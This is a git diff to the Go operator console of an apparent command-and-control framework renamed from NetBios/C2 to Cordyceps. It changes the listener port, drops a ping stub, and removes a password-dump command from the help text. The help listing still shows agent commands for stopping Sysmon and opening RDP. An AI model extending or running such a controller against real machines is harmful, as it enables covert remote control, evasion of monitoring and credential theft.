@@ -1,8 +1,8 @@
 package main
 
 import (
-	commons "NetBios/C2/d3c/commons/estruturas"
-	"NetBios/C2/d3c/commons/helpers"
+	commons "Cordyceps/commons/estruturas"
+	"Cordyceps/commons/helpers"
 	"bufio"
 	"encoding/gob"
 	"fmt"
@@ -33,7 +33,7 @@ func main() {
 	println("")
 	println("")
 	//Escuta na porta 9090
-	go startListener("9090")
+	go startListener("54321")
 	cliHandler()
 }
 
@@ -93,8 +93,6 @@ func cliHandler() {
 				}
 			case "exit":
 				exitHandler(comandoSeparado)
-			case "ping":
-				pongHandler(comandoSeparado)
 			default:
 				if agenteSelecionado != "" {
 					//Envia o Comando para o agente selecionado
@@ -126,8 +124,6 @@ func helpHandler(comando []string) {
 		println("stopsys:                  Stop Sysmon Service Running")
 		println("startsys:                  Start Sysmon Service Running")
 		println("rdp:                  Open Port And Service Remote Desktop")
-		//TODO - Modulo de Quebrar Senhas
-		println("passwd:           Dump Passwords for local machine")
 	} else {
 		println("Comando não Encontrado")
 	}
@@ -147,11 +143,6 @@ func showHandler(comando []string) {
 			log.Println("Command Passed Wrong, Use: show agents -a")
 		}
 	}
-}
-
-func pongHandler(comando []string) {
-	//TODO - Implementar Funcao para verificar conexao
-
 }
 
 func selectHandler(comando []string) {
